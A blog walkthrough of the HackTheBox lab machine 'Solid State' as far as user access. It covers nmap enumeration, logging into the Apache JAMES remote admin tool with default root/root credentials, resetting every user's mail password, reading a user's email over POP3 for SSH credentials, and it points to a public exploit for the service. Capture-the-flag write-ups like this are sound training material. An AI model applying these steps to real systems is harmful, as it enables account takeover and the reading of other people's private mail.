---
layout: post
title: "HackTheBox: Solid State Boot2User"
description: "hackthebox solid state walkthrough"
thumb_image: "TODO"
tags: [web, ctf, overthewire]
permalink: /posts/SolidState
---

## Enumeration
We'll start off with nmap scans.

My methodology on networks that we have good access to is to initially do a SYN scan of all ports and then do more thorough scanning of those we find to be open. It's good practice to keep an eye on this initial scanning, if we see it's running slowly it may be that we're tripping a firewall.

So we start off with a SYN scan (-sS), of all ports (-p-), there's no DNS in this environment so let's turn off name resolution (-n), and save output in all formats with the filename "allports" (-oA allports).

nmap -n -p- -sS -oA allports 10.10.10.51:

```
# Nmap 7.60 scan initiated Mon May 28 02:40:13 2018 as: nmap -n -p- -sS -oA allports 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up (0.066s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

# Nmap done at Mon May 28 02:40:55 2018 -- 1 IP address (1 host up) scanned in 41.72 seconds
```

Now let's enumerate these open ports (-p 22, 25, 80, 110, 119, 455) using service detection (-sV) and default scripts (-sC), saving all outputs with the filename "thorough" (-oA thorough) and with name resolution still off (-n):

```
# Nmap 7.60 scan initiated Mon May 28 02:42:30 2018 as: nmap -p 22,25,80,110,119,4555 -sC -sV -oA thorough -n 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up (0.065s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.11 [10.10.14.11]),
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2

# Nmap done at Mon May 28 02:42:57 2018 -- 1 IP address (1 host up) scanned in 26.92 seconds
```

So we have 6 ports open. From the service detection results it appears we have a mail server, running apache JAMES. Time to work out a plan of attack.

**Port 22** is showing a reasonably modern SSH service, this will be our lowest priority to look at.

**Port 25** is SMTP, we could see if [SMTP enumeration](https://pentestlab.blog/2012/11/20/smtp-user-enumeration/) is a possibility, this is a medium priority.

**Port 80** is HTTP, having a quick look in a browser it looks like a basic web app, definitely something we'll want to check out, we'll note this down as a high priority and start nikto scanning in the background.

**Port 110** is POP3, but we don't have any credentials, once again a low priority at the moment.

**Port 119** is NNTP, quick google indicates it's something to do with usenet, we'll say it's a low priority for now.

**Port 4555** is remote admin for JAMES. Sirens should be going off when see the words remote and admin. Let's make this our top priority.

## Poking at Remote Admin
Connecting to the port with netcat ```nc -nv 10.10.10.51 4555``` we're prompted for a username and password.

Trying admin/admin kicks us back to the start of the prompt where we can immediately try again. It doesn't appear that there are cooldowns on repeated attempts so we can probably script a bruteforcer if we get stuck.

Let's quickly try the obvious candidates first, root/password, admin/password etc. We don't have to try for long as root/root grants us access!

```
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Help gives us a list of commands:

```
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

"Display existing accounts" sounds like the sort of thing we'd be interested in, and while we're at it let's change the password for each user to be their username:

```
countusers
Existing accounts 5

listusers
user: james
user: thomas
user: john
user: mindy
user: mailadmin

setpassword james james
Password for james reset

setpassword thomas thomas
Password for thomas reset

setpassword john john
Password for john reset

setpassword mindy mindy
Password for mindy reset

setpassword mailadmin
Password for mailadmin reset
```

So we now have username and passwords for a bunch of users. That POP3 port that we didn't have credentials for might make itself useful after all!

We can telnet to port 110 ```telnet 10.10.10.51 110```. POP3 is an extremely simple protocol to interact with. From the [RFC](https://www.ietf.org/rfc/rfc1939.txt) our commands are:


      Minimal POP3 Commands:

         USER name               valid in the AUTHORIZATION state
         PASS string
         QUIT
         STAT                    valid in the TRANSACTION state
         LIST [msg]
         RETR msg
         DELE msg
         NOOP
         RSET
         QUIT

Logging in with each user and checking for email, we find for Mindy:

```
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

## Shell

To get a user shell we can simply log in via SSH using the credentials given in the email. From here we can cat the user flag.

Halfway there. Stay tuned for part two where we get full root credentials.

## Notes

Guessing the default creds for the remote admin tool was pure luck, a sensible next step would have been searching for JAMES exploits. ```searchsploit apache james``` shows us a python exploit https://www.exploit-db.com/exploits/35513/ We did't have the requisite authenticated user at that moment, but reading through the exploit would have also given us the default creds "root" "root".
